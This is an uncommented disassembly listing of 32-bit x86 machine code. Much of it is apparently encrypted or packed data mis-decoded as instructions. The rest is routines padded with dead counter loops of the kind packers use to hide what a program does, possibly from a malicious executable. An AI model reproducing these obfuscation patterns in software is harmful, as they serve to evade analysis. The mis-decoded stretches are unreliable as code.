  406361:	xor    al,0xf8
  406363:	ins    BYTE PTR es:[edi],dx
  406364:	or     ebp,DWORD PTR [ecx-0x56]
  406367:	mov    dl,0xad
  406369:	push   edx
  40636a:	mov    ebp,0x1e613c92
  40636f:	xchg   DWORD PTR [ebx],edx
  406371:	fcmovnu st,st(1)
  406373:	xor    eax,0xb4e5faad
  406378:	cwde   
  406379:	out    0x6a,al
  40637b:	loop   0x4063b7
  40637d:	ror    esp,0x8d
  406380:	add    eax,0xff607941
  406385:	and    BYTE PTR [ecx+0x6d],0xa3
  406389:	lea    ecx,[ecx-0xb]
  40638c:	cmp    BYTE PTR [ebx+0x3fd9c9e1],0x3e
  406393:	sar    BYTE PTR [ecx+esi*4],1
  406396:	mov    ebp,0x9df4b79
  40639b:	adc    al,BYTE PTR [ebx+0x1abb71a5]
  4063a1:	xor    al,0x10
  4063a3:	dec    esp
  4063a4:	fisttp QWORD PTR [ecx+0x1b64783b]
  4063aa:	call   0xcf22:0x863699b2
  4063b1:	xchg   ebp,eax
  4063b2:	cwde   
  4063b3:	aad    0x62
  4063b5:	push   ds
  4063b6:	sbb    ah,BYTE PTR [ecx]
  4063b8:	push   DWORD PTR [ebp-0xc]
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x6ee0,0xa9
  4063d1:	jbe    0x4063bc
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x4063f5
  4063dc:	lahf   
  4063dd:	jmp    DWORD PTR [ebp+0x55545281]
  4063e3:	in     al,dx
  4063e4:	mov    eax,0xcb5584c2
  4063e9:	arpl   dx,di
  4063eb:	sub    DWORD PTR [edx-0x37db49d7],0x5f32ae80
  4063f5:	sahf   
  4063f6:	pop    edi
  4063f7:	add    DWORD PTR [edx+0x32],ecx
  4063fa:	pop    edx
  4063fb:	imul   esi,DWORD PTR [eax-0x2b8dd935],0xf694a06b
  406405:	popf   
  406406:	test   al,0x46
  406408:	or     al,BYTE PTR [ebx+ebp*2+0x4a9406ec]
  40640f:	enter  0x4aab,0x86
  406413:	cmp    bl,BYTE PTR [edi+0x73]
  406416:	ss daa 
  406418:	jnp    0x40644a
  40641a:	scas   eax,DWORD PTR es:[edi]
  40641b:	or     al,0xe5
  40641d:	mov    esp,DWORD PTR [ebp-0x3ff9e76]
  406423:	xor    al,0xca
  406425:	fistp  DWORD PTR [edx+0x63c9f491]
  40642b:	and    WORD PTR [eax-0x3b],0xffa6
  406430:	nop
  406431:	sahf   
  406432:	xchg   ecx,eax
  406433:	jne    0x40642f
  406435:	leave  
  406436:	push   ecx
  406437:	rol    DWORD PTR [edx-0x6a7a97c6],0xe6
  40643e:	ror    BYTE PTR [edx+0x1f7180b2],0x62
  406445:	dec    ecx
  406446:	in     al,0xbe
  406448:	mov    ds:0x36465ceb,al
  40644d:	mov    eax,ds:0x3eae2cc4
  406452:	dec    ebx
  406453:	inc    edi
  406454:	adc    dl,cl
  406456:	dec    esp
  406457:	jg     0x40645b
  406459:	jns    0x4064c7
  40645b:	fs test eax,0x4de79919
  406461:	mov    eax,0xa82dc04e
  406466:	xchg   ebx,eax
  406467:	cmp    cl,BYTE PTR [ebx-0x7b]
  40646a:	xor    eax,DWORD PTR [edi+0x5c]
  40646d:	aaa    
  40646e:	fnstcw WORD PTR [ebx+0x53a94274]
  406474:	dec    edi
  406475:	nop
  406476:	xchg   esp,eax
  406477:	ds ja  0x4064e5
  40647a:	push   esp
  40647b:	cld    
  40647c:	inc    esp
  40647d:	dec    eax
  40647e:	push   eax
  40647f:	jae    0x406447
  406481:	xchg   esi,eax
  406482:	mov    esp,0x50346d98
  406487:	(bad)  
  406488:	out    0x8d,al
  40648a:	(bad)  
  40648b:	repz cld 
  40648d:	inc    eax
  40648e:	adc    BYTE PTR [ecx+edx*1],bl
  406491:	jl     0x406422
  406493:	pusha  
  406494:	pop    ebx
  406495:	cmp    al,0x39
  406497:	test   DWORD PTR [edi],ecx
  406499:	xchg   ecx,eax
  40649a:	in     eax,dx
  40649b:	stos   DWORD PTR es:[edi],eax
  40649c:	mov    cl,0x94
  40649e:	add    eax,0x3eb391b3
  4064a3:	loopne 0x40651d
  4064a5:	pusha  
  4064a6:	cmc    
  4064a7:	dec    edx
  4064a8:	and    BYTE PTR [ecx-0x627416e],0x49
  4064af:	inc    ebx
  4064b0:	jbe    0x40643a
  4064b2:	lods   eax,DWORD PTR ds:[esi]
  4064b3:	repz mov ebx,0x598d89c1
  4064b9:	mov    edx,0xeeae88f3
  4064be:	jnp    0x40647a
  4064c0:	jecxz  0x4064dc
  4064c2:	mov    eax,0xab5b1da5
  4064c7:	stos   BYTE PTR es:[edi],al
  4064c8:	(bad)  
  4064c9:	retf   0x9bf1
  4064cc:	test   al,0x6e
  4064ce:	xor    al,0x30
  4064d0:	sbb    al,0x4b
  4064d2:	push   ecx
  4064d3:	mov    bl,0x53
  4064d5:	xchg   ecx,eax
  4064d6:	sbb    eax,0x8fd59925
  4064db:	push   ds
  4064dc:	sahf   
  4064dd:	push   edx
  4064de:	and    BYTE PTR [ecx-0x35ef9578],0x24
  4064e5:	push   ebp
  4064e6:	clc    
  4064e7:	aas    
  4064e8:	jnp    0x4064c6
  4064ea:	stc    
  4064eb:	mov    eax,0xb6cf41af
  4064f0:	(bad)  
  4064f1:	cdq    
  4064f2:	aam    0xc1
  4064f4:	and    ebx,DWORD PTR [ebp-0x6dea7c30]
  4064fa:	mov    edi,0xdbdff9ec
  4064ff:	jge    0x4064fc
  406501:	mov    ebx,0x3e27531b
  406506:	mov    esi,DWORD PTR [edi+0x15]
  406509:	xchg   BYTE PTR [ebp+0x66],al
  40650c:	push   ebx
  40650d:	aad    0x4b
  40650f:	mov    ecx,0x32d0af8b
  406514:	sub    edi,ebx
  406516:	xchg   DWORD PTR [ebp-0x743a37e5],ebx
  40651c:	sbb    eax,0x34be59b8
  406521:	clc    
  406522:	push   0x7e
  406524:	or     BYTE PTR [edx-0x61],ch
  406527:	jnp    0x406535
  406529:	adc    esi,DWORD PTR [esi-0x7b71a04]
  40652f:	pop    eax
  406530:	enter  0x9ada,0xd4
  406534:	outs   dx,DWORD PTR ds:[esi]
  406535:	(bad)  
  406536:	lock out 0x1d,al
  406539:	xchg   esp,eax
  40653a:	inc    esi
  40653b:	arpl   WORD PTR [edx+0x1f],bp
  40653e:	je     0x406588
  406540:	xor    eax,0x50c4cae1
  406545:	jbe    0x4065af
  406547:	(bad)  
  406548:	mov    dl,0x15
  40654a:	sub    ah,BYTE PTR [edi]
  40654c:	xchg   ch,ch
  40654e:	inc    esp
  40654f:	push   cs
  406550:	dec    ebx
  406551:	push   eax
  406552:	lock loope 0x406547
  406555:	dec    ecx
  406556:	int    0xa4
  406558:	and    ah,BYTE PTR [eax-0x562158a4]
  40655e:	jle    0x40655b
  406560:	pop    esi
  406561:	push   0x53
  406563:	xchg   DWORD PTR [edi-0x64853b40],esp
  406569:	sub    cl,bh
  40656b:	and    eax,0x3f2b5ef0
  406570:	mov    ecx,0x49815d7b
  406575:	das    
  406576:	loope  0x406560
  406578:	pop    ecx
  406579:	sub    BYTE PTR [esi],0xc9
  40657c:	mov    al,ah
  40657e:	retf   0xab
  406581:	fmul   DWORD PTR [eax]
  406583:	pop    es
  406584:	pop    ds
  406585:	pop    ecx
  406586:	mov    dl,0x91
  406588:	mov    dl,0x65
  40658a:	jle    0x406605
  40658c:	cmp    ecx,DWORD PTR [edx+edi*1]
  40658f:	cdq    
  406590:	inc    esi
  406591:	pop    esp
  406592:	std    
  406593:	enter  0x7e2b,0x8c
  406597:	gs sbb eax,0x24c87c0d
  40659d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40659e:	pusha  
  40659f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a1:	jge    0x4065cc
  4065a3:	dec    edx
  4065a4:	xor    DWORD PTR [eax-0x2e],ecx
  4065a7:	mov    ebx,0x82bc7285
  4065ac:	and    ebp,esi
  4065ae:	(bad)  
  4065af:	repz sub eax,0xa3ccdfc6
  4065b5:	aaa    
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x2f3b50a3]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x4065f0
  40660b:	xchg   bl,bl
  40660d:	cmp    ebp,0xdbf87048
  406613:	nop
  406614:	aas    
  406615:	push   edx
  406616:	(bad)  
  406619:	jg     0x406643
  40661b:	lahf   
  40661c:	out    dx,eax
  40661d:	mov    al,ds:0x8d989bce
  406622:	push   ss
  406623:	push   ds
  406624:	fabs   
  406626:	lea    ecx,[ecx-0x3f70316f]
  40662c:	cmp    BYTE PTR [esi-0x27b6ac4a],0xf
  406633:	ret    
  406634:	jmp    0xbd0e:0x3993edd8
  40663b:	adc    edi,esi
  40663d:	mov    ebp,0xbb90552b
  406642:	ficomp DWORD PTR [edi+edx*8-0x4da35dd0]
  406649:	adc    al,0x2b
  40664b:	(bad)  
  40664d:	or     dh,ah
  40664f:	mov    ah,dl
  406651:	or     DWORD PTR [esi-0xc],edi
  406654:	mov    ebx,0x37726698
  406659:	adc    eax,0xdd72b396
  40665e:	xlat   BYTE PTR ds:[ebx]
  40665f:	test   BYTE PTR [ebx],al
  406661:	pop    ebx
  406662:	jmp    0x5cbe:0x8b690686
  406669:	retf   0xb44e
  40666c:	lea    eax,[ecx+0x1a23c8c5]
  406672:	pusha  
  406673:	cdq    
  406674:	daa    
  406675:	push   ecx
  406676:	and    bl,0xa1
  406679:	jg     0x4066a2
  40667b:	mov    cl,0xd9
  40667d:	adc    DWORD PTR [eax-0x70],edx
  406680:	iret   
  406681:	push   ss
  406682:	in     eax,0xc
  406684:	enter  0xb7bb,0xf1
  406688:	xor    esi,ebx
  40668a:	sub    edi,0x13
  40668d:	scas   al,BYTE PTR es:[edi]
  40668e:	add    esi,DWORD PTR [ebp-0x3a63c85e]
  406694:	add    esp,ebx
  406696:	and    BYTE PTR [ebx],0xc5
  406699:	repnz test eax,0x924733a9
  40669f:	dec    eax
  4066a0:	(bad)  
  4066a1:	stc    
  4066a2:	xchg   ebx,eax
  4066a3:	nop
  4066a4:	adc    bl,dh
  4066a6:	fiadd  DWORD PTR [ecx-0x19d676ad]
  4066ac:	out    0xf6,eax
  4066ae:	mov    BYTE PTR [eax+edx*1-0x1e],cl
  4066b2:	mov    ds:0x238027d6,al
  4066b7:	icebp  
  4066b8:	sub    al,0xaa
  4066ba:	stc    
  4066bb:	sub    DWORD PTR [esi+esi*8],ecx
  4066be:	sti    
  4066bf:	(bad)  
  4066c0:	cli    
  4066c1:	cs pop ss
  4066c3:	xchg   edx,eax
  4066c4:	jno    0x40669f
  4066c6:	xchg   DWORD PTR [eax-0x89aaaf7],ebx
  4066cc:	add    DWORD PTR [esi+0x5bb432a5],esi
  4066d2:	xor    al,0x4c
  4066d4:	stos   DWORD PTR es:[edi],eax
  4066d5:	lods   eax,DWORD PTR ds:[esi]
  4066d6:	lock in al,dx
  4066d8:	mov    eax,ds:0x3ad93cc9
  4066dd:	enter  0x6ee,0xdf
  4066e1:	fcomp  DWORD PTR [ebx-0x3920ea86]
  4066e7:	fnstsw WORD PTR [ebx]
  4066e9:	dec    ecx
  4066ea:	nop
  4066eb:	pop    ss
  4066ec:	pop    edx
  4066ed:	mov    ecx,db2
  4066f0:	pop    edi
  4066f1:	add    dl,ch
  4066f3:	jle    0x406735
  4066f5:	xchg   ebp,eax
  4066f6:	mov    ecx,0x10dd8862
  4066fb:	adc    edx,DWORD PTR [ecx+0x6b]
  4066fe:	sub    eax,0x2177bf1b
  406703:	pmuludq mm5,mm2
  406706:	nop
  406707:	inc    ecx
  406708:	add    dl,0xa5
  40670b:	mov    ah,0x9e
  40670d:	rol    DWORD PTR [esi],cl
  40670f:	and    eax,0x668debd5
  406714:	cs push ecx
  406716:	sub    BYTE PTR [ecx],al
  406718:	aaa    
  406719:	dec    edi
  40671a:	test   al,cl
  40671c:	adc    ah,BYTE PTR [ebx]
  40671e:	ins    BYTE PTR es:[edi],dx
  40671f:	es pop ebp
  406721:	aam    0x7f
  406723:	jo     0x406730
  406725:	imul   ebx,DWORD PTR [edi+0x1d],0xffffffa6
  406729:	or     cl,dh
  40672b:	stc    
  40672c:	(bad)  
  40672d:	mov    dl,0xc1
  40672f:	ins    BYTE PTR es:[edi],dx
  406730:	out    dx,al
  406731:	js     0x406740
  406733:	outs   dx,BYTE PTR ds:[esi]
  406734:	je     0x406749
  406736:	xor    esi,DWORD PTR ds:0xd20139fc
  40673c:	rcl    dh,0xf1
  40673f:	mul    DWORD PTR [edx-0x4e15837d]
  406745:	mov    dh,BYTE PTR [ecx+0x6b]
  406748:	and    ah,ch
  40674a:	cmp    DWORD PTR [edx+0x3a316f50],edi
  406750:	push   esi
  406751:	lock sbb eax,0x236a2ece
  406757:	xor    al,0xe5
  406759:	or     al,0xf7
  40675b:	and    BYTE PTR [esi+0x61],0x7e
  40675f:	pop    ds
  406760:	scas   eax,DWORD PTR es:[edi]
  406761:	rcl    BYTE PTR [edi-0xac7ced4],1
  406767:	rol    dl,0x28
  40676a:	xchg   esi,eax
  40676b:	jno    0x406742
  40676d:	inc    edx
  40676e:	into   
  40676f:	cmp    al,0x12
  406771:	add    esi,DWORD PTR [edi]
  406773:	js     0x406717
  406775:	idiv   BYTE PTR [ebx+0x55]
  406778:	fnsave ds:0xa9726d2a
  40677e:	imul   esi,DWORD PTR [ebp+0x41],0xffffffe7
  406782:	push   ecx
  406783:	jb     0x4067a9
  406785:	xor    DWORD PTR [ebp+0x48],0x7a
  406789:	xchg   edx,eax
  40678a:	js     0x40679a
  40678c:	inc    edx
  40678d:	shl    DWORD PTR ds:0x3112b80d,0xae
  406794:	mov    bh,0x6
  406796:	pushf  
  406797:	shr    DWORD PTR [edx+0x3d9e0b82],0xd
  40679e:	rol    DWORD PTR [eax-0x12],0x98
  4067a2:	cli    
  4067a3:	aaa    
  4067a4:	sbb    bl,dh
  4067a6:	(bad)  
  4067a7:	in     eax,0x8e
  4067a9:	cld    
  4067aa:	in     al,dx
  4067ab:	sbb    al,0xd5
  4067ad:	jb     0x4067f9
  4067af:	push   ebx
  4067b0:	or     eax,0x9eb4aa8
  4067b5:	xchg   BYTE PTR [esi+0x5a],bl
  4067b8:	lods   eax,DWORD PTR ds:[esi]
  4067b9:	mov    cl,0x3d
  4067bb:	pop    ss
  4067bc:	mov    ah,cl
  4067be:	push   eax
  4067bf:	cmp    edx,ebp
  4067c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067c2:	sub    al,0x8a
  4067c4:	das    
  4067c5:	xchg   ebp,eax
  4067c6:	pop    ecx
  4067c7:	fcomp  DWORD PTR [ecx-0x91420da]
  4067cd:	or     BYTE PTR [bx+0x5f16],dl
  4067d2:	rcl    esp,1
  4067d4:	cmp    al,0x36
  4067d6:	aam    0xda
  4067d8:	stos   BYTE PTR es:[edi],al
  4067d9:	push   ecx
  4067da:	inc    ebx
  4067db:	out    0x85,eax
  4067dd:	(bad)  [eax+0x17776dc5]
  4067e3:	pop    eax
  4067e4:	add    DWORD PTR [eax-0x32729b],edi
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0xf350:0x7bf3f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	arpl   WORD PTR [ebx],si
  406866:	gs jne 0x40683e
  406869:	ss (bad) 
  40686b:	xor    eax,0xc1b058f7
  406870:	or     eax,ecx
  406872:	pop    esi
  406873:	mov    esi,DWORD PTR [ecx-0x6073c402]
  406879:	fnstcw WORD PTR [ebx+0x42]
  40687c:	xchg   esp,eax
  40687d:	add    al,0x68
  40687f:	test   al,0xeb
  406881:	add    al,BYTE PTR [esi-0x42351d3]
  406887:	ins    BYTE PTR es:[edi],dx
  406888:	inc    ecx
  406889:	xchg   ebp,eax
  40688a:	enter  0x1393,0xff
  40688e:	xchg   BYTE PTR [edi+0x33],al
  406891:	(bad)  
  406892:	imul   esi,DWORD PTR [edx],0xe369161f
  406898:	fisttp DWORD PTR [ecx]
  40689a:	xchg   DWORD PTR [ebx],ebp
  40689c:	jns    0x406900
  40689e:	mov    dh,0x49
  4068a0:	and    DWORD PTR [esi-0x4],esi
  4068a3:	rcl    DWORD PTR [esi-0x1d],1
  4068a6:	sub    cl,cl
  4068a8:	outs   dx,DWORD PTR ds:[esi]
  4068a9:	cmp    BYTE PTR [edi],dh
  4068ab:	das    
  4068ac:	mov    ah,0x85
  4068ae:	inc    esi
  4068af:	jge    0x4068e4
  4068b1:	loop   0x406835
  4068b3:	mov    dh,0x54
  4068b5:	clc    
  4068b6:	in     eax,dx
  4068b7:	imul   ebx,DWORD PTR [ebx+eax*8-0x1d],0x28
  4068bc:	out    dx,al
  4068bd:	mov    ecx,edi
  4068bf:	je     0x406883
  4068c1:	aam    0xca
  4068c3:	add    eax,DWORD PTR [ebp+0x4]
  4068c6:	xchg   edi,eax
  4068c7:	cmp    eax,0x6b5b37a8
  4068cc:	cmp    dh,ah
  4068ce:	inc    ebp
  4068cf:	in     al,dx
  4068d0:	dec    ebp
  4068d1:	xchg   edi,eax
  4068d2:	shl    DWORD PTR [eax-0x56b16c44],1
  4068d8:	les    ebp,FWORD PTR [edx]
  4068da:	cli    
  4068db:	inc    esi
  4068dc:	sbb    al,0xe9
  4068de:	push   esi
  4068df:	sahf   
  4068e0:	dec    ebp
  4068e1:	in     eax,0xaf
  4068e3:	gs test bh,ah
  4068e6:	xor    esp,DWORD PTR [ebp+edi*8-0x65]
  4068ea:	cmp    al,0xdf
  4068ec:	and    dl,al
  4068ee:	addr16 std 
  4068f0:	xor    eax,0xc5b7a9a8
  4068f5:	or     al,0xd1
  4068f7:	mov    esp,0x16e30929
  4068fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068fd:	imul   ebx,DWORD PTR [ebx+0x429deef5],0xbd23e0
  406907:	mov    esp,0xb9126e18
  40690c:	rol    BYTE PTR [ebx+0x48065f26],0x20
  406913:	ret    
  406914:	sub    al,BYTE PTR [ebp+0x7a]
  406917:	stos   DWORD PTR es:[edi],eax
  406918:	inc    esi
  406919:	das    
  40691a:	ja     0x4068d0
  40691c:	add    ebp,esp
  40691e:	test   DWORD PTR [edi-0x32],0x17a3b4db
  406925:	outs   dx,DWORD PTR ds:[si]
  406927:	int    0xf1
  406929:	ret    
  40692a:	sub    al,0x7e
  40692d:	nop
  40692e:	cmp    al,0x99
  406930:	xchg   ebp,eax
  406931:	sub    DWORD PTR [ebp-0x2c],esp
  406934:	cmc    
  406935:	jl     0x406986
  406937:	mov    eax,ds:0xc9f176bc
  40693c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40693d:	js     0x406958
  40693f:	hlt    
  406940:	in     al,0xa3
  406942:	hlt    
  406943:	or     dl,dl
  406945:	loopne 0x40690a
  406947:	mov    cl,0x98
  406949:	push   ecx
  40694a:	mov    al,0x1f
  40694c:	js     0x4069c3
  40694e:	stc    
  40694f:	in     eax,dx
  406950:	jbe    0x4069c9
  406952:	push   ds
  406953:	add    al,0x69
  406955:	push   edi
  406956:	xlat   BYTE PTR ds:[ebx]
  406957:	stos   DWORD PTR es:[edi],eax
  406958:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40695a:	push   edi
  40695b:	jmp    0x40694b
  40695d:	out    0x69,eax
  40695f:	sub    al,0x90
  406961:	pop    esi
  406962:	out    dx,al
  406963:	shr    BYTE PTR [esi+0x1f],1
  406966:	jp     0x4069e5
  406968:	or     ah,BYTE PTR [edx+ebx*2-0x3a]
  40696c:	jle    0x40698d
  40696e:	mov    eax,0x7a34651b
  406973:	fild   QWORD PTR [eax-0x17]
  406976:	rol    DWORD PTR [ebp+0x69],1
  406979:	jo     0x40694d
  40697b:	xchg   edx,eax
  40697c:	push   ebp
  40697d:	xor    cl,0x21
  406980:	bound  edx,QWORD PTR [edi+0x41e7a139]
  406986:	sub    ch,BYTE PTR [esi]
  406988:	sub    dh,BYTE PTR [esi-0x3930cb73]
  40698e:	xchg   ebx,eax
  40698f:	test   dl,0x88
  406992:	mov    esp,0x9deb0abd
  406997:	hlt    
  406998:	jo     0x40695a
  40699a:	call   eax
  40699c:	cld    
  40699d:	xchg   ecx,eax
  40699e:	pop    edi
  40699f:	jle    0x4069ae
  4069a1:	cli    
  4069a2:	cmp    ecx,DWORD PTR [ebx-0x29281536]
  4069a8:	sub    bl,dl
  4069aa:	push   ss
  4069ab:	bound  ebx,QWORD PTR [edx]
  4069ad:	aaa    
  4069ae:	imul   BYTE PTR [edi+0xca2ab7f]
  4069b4:	push   esi
  4069b5:	scas   eax,DWORD PTR es:[edi]
  4069b6:	pushf  
  4069b7:	xlat   BYTE PTR fs:[ebx]
  4069b9:	icebp  
  4069ba:	sahf   
  4069bb:	ins    DWORD PTR es:[edi],dx
  4069bc:	xchg   BYTE PTR [edi],cl
  4069be:	aam    0xa3
  4069c0:	inc    eax
  4069c1:	retf   
  4069c2:	push   esi
  4069c3:	retf   0x4ef7
  4069c6:	arpl   WORD PTR [edi+esi*8],dx
  4069c9:	jo     0x4069c7
  4069cb:	push   esp
  4069cc:	inc    eax
  4069cd:	cmp    DWORD PTR [edi],edx
  4069cf:	or     bh,dl
  4069d1:	mov    WORD PTR [eax+0x17],gs
  4069d4:	push   eax
  4069d5:	bound  esp,QWORD PTR [edi+esi*8]
  4069d8:	cmp    ebx,DWORD PTR [ecx+0x29]
  4069db:	xor    BYTE PTR [eax-0x19],bh
  4069de:	adc    eax,0x57f4e7a7
  4069e3:	and    bh,BYTE PTR [edi+esi*4]
  4069e6:	jb     0x406a46
  4069e8:	in     eax,dx
  4069e9:	push   ebp
  4069ea:	mov    ebp,0x532c046d
  4069ef:	and    ch,BYTE PTR [edx-0x11]
  4069f2:	push   esi
  4069f3:	dec    eax
  4069f4:	test   al,0xc9
  4069f6:	or     al,cl
  4069f8:	lea    ebp,[esi-0x5d]
  4069fb:	das    
  4069fc:	arpl   WORD PTR [esi+ecx*4],cx
  4069ff:	adc    dl,al
  406a01:	push   es
  406a02:	xchg   ecx,eax
  406a03:	test   eax,0x26a2b582
  406a08:	mov    WORD PTR [edx+eax*8+0x6ac6e3b5],gs
  406a0f:	add    dl,bl
  406a11:	sbb    ch,BYTE PTR [ebp-0x6dafd384]
  406a17:	rol    BYTE PTR [eax+0x39],1
  406a1a:	pop    esp
  406a1b:	fistp  WORD PTR [esi+0x3d]
  406a1e:	mov    dh,0xb6
  406a20:	sub    ah,0xb5
  406a23:	sbb    eax,0xa5dd098e
  406a28:	sbb    ah,cl
  406a2a:	fcomp  DWORD PTR [edx]
  406a2c:	into   
  406a2d:	bswap  ebp
  406a2f:	pusha  
  406a30:	loope  0x406a88
  406a32:	repnz lds esp,FWORD PTR [ebx-0x3f]
  406a36:	mov    ch,0x94
  406a38:	add    dl,0x5b
  406a3b:	xor    dl,BYTE PTR [eax-0x7]
  406a3e:	sbb    DWORD PTR [eax-0x1],0x50
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ed63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ed63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ed63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42eb9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ed63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ed63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430467
  406aa5:	xor    edi,DWORD PTR ds:0x4303b5
  406aab:	mov    DWORD PTR ds:0x430467,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4303dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4303dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4303dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4303dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e837
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42eb9f
  406af9:	cmp    DWORD PTR ds:0x4303dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43045f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43045f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43045f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e95f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43045f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43045f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4303b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430457,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430457
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430457,ecx
  406b87:	cmp    DWORD PTR ds:0x430457,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430457,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e766
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42ea27
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e748
  406bcd:	add    DWORD PTR ds:0x4303bd,ecx
  406bd3:	mov    ecx,0x32729b
